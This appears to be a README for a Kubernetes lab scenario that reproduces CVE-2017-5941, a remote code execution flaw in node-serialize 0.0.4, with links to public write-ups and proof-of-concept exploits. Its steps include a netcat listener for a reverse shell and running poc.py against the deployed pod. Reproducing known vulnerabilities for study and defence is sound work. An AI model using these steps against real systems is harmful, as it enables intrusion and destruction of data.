## CVE-2017-5941
https://nvd.nist.gov/vuln/detail/CVE-2017-5941#range-6741888 \
Target Application: Node \
Software Link: https://www.npmjs.com/package/node-serialize \
Version: 0.0.4 \
Writeup: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ \
Used PoCs: 
* https://packetstormsecurity.com/files/161356/Node.JS-Remote-Code-Execution.html
* https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

### Steps to Reproduce

1- `minikube start` \
2- `kubectl apply -f scenario-1-server.yaml` \
3- Forward port `kubectl port-forward pods/scenario-1-server-deployment-c9b7c56cf-ggvgm 4242:4242` \
4- Listen on port `1234` and your ip for TCP connections like `nc -l 144.122.139.40 1234` \
5- Run poc.py with your ip `./poc.py 144.122.139.40` \
6- Attacker now can view and delete anything they want.

### Kubernetes
Check https://learnk8s.io/deploying-nodejs-kubernetes for deployment tutorial
